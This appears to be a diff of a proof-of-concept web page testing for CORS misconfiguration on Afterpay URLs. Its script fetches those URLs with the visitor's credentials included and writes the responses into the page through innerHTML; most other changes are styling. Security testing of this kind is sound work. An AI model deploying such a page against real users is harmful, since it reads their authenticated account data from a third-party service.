@@ -3,16 +3,19 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>CORS Misconfiguration Test</title>
+<title>CORS Misconfiguration Proof of Concept</title>
 <style>
-  body { font-family: Arial, sans-serif; padding: 20px; }
-  pre { background: #f4f4f4; padding: 10px; border-radius: 5px; }
+  body { font-family: Arial, sans-serif; padding: 20px; background: #fafafa; }
+  h1 { color: #333; }
+  h2 { margin-top: 30px; color: #555; }
+  pre { background: #eee; padding: 10px; border-radius: 5px; max-height: 200px; overflow-y: auto; white-space: pre-wrap; word-break: break-word; }
   .success { color: green; }
   .fail { color: red; }
 </style>
 </head>
 <body>
   <h1>CORS Misconfiguration Proof of Concept</h1>
+  <p>This page fetches multiple Afterpay URLs with credentials included to test CORS policy.</p>
   <div id="results"></div>
 
   <script>
@@ -29,11 +32,7 @@
 
     async function testUrl(url) {
       try {
-        const response = await fetch(url, {
-          method: 'GET',
-          credentials: 'include'
-        });
-
+        const response = await fetch(url, { method: 'GET', credentials: 'include' });
         const text = await response.text();
 
         resultsDiv.innerHTML += `
